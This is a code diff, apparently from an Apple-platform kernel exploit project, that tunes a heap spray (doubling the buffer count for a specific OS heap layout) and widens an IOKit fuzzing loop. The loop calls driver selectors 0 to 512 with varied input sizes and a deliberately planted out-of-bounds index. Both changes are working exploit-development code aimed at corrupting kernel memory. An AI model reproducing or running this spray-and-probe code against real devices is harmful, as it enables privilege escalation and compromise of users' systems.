@@ -1259,8 +1259,7 @@ cleanup:
     size_t spraySz = 4288;
     scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);
 
-    enum { NBUFS = 4096 };
-    enum { OBJ_SZ = 32, OBJ_LEN = 0x20 };
+    enum { NBUFS = 8192 };  // doubled for 27.0.1 heap layout
     void **bufs = calloc(NBUFS, sizeof(void *));
     if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
     int got = 0, holes = 0;
@@ -1865,14 +1864,16 @@ cleanup:
         uint8_t out[64] = {0};
         size_t outSz = sizeof(out);
 
-        // Try selectors around the handle API — print ALL non-generic results
-        for (int sel = 0; sel < 128; sel++) {
-            size_t inSz = sizeof(in);
-            outSz = sizeof(out);
-            kr = IOConnectCallMethod(uc, sel, sc, 4, in, inSz, out, &outSz, NULL, NULL);
-            // Print anything that's not the generic "unsupported" error
-            if (kr != (kern_return_t)0xe00002c2) {
-                [r appendFormat:@"  sel %d: kr=0x%x outSz=%zu\n", sel, (int)kr, outSz];
+        // Try selectors 0-512 with multiple input sizes
+        for (int sel = 0; sel < 512; sel++) {
+            for (size_t inSz = 0; inSz <= 64; inSz += 8) {
+                outSz = sizeof(out);
+                memset(in, 0, sizeof(in));
+                if (inSz >= 8) *(uint32_t *)in = 0x1000;  // OOB index
+                kr = IOConnectCallMethod(uc, sel, sc, 4, in, inSz, out, &outSz, NULL, NULL);
+                if (kr != (kern_return_t)0xe00002c2 && kr != KERN_INVALID_ARGUMENT) {
+                    [r appendFormat:@"  sel %d in=%zu: kr=0x%x outSz=%zu\n", sel, inSz, (int)kr, outSz];
+                }
             }
         }
 
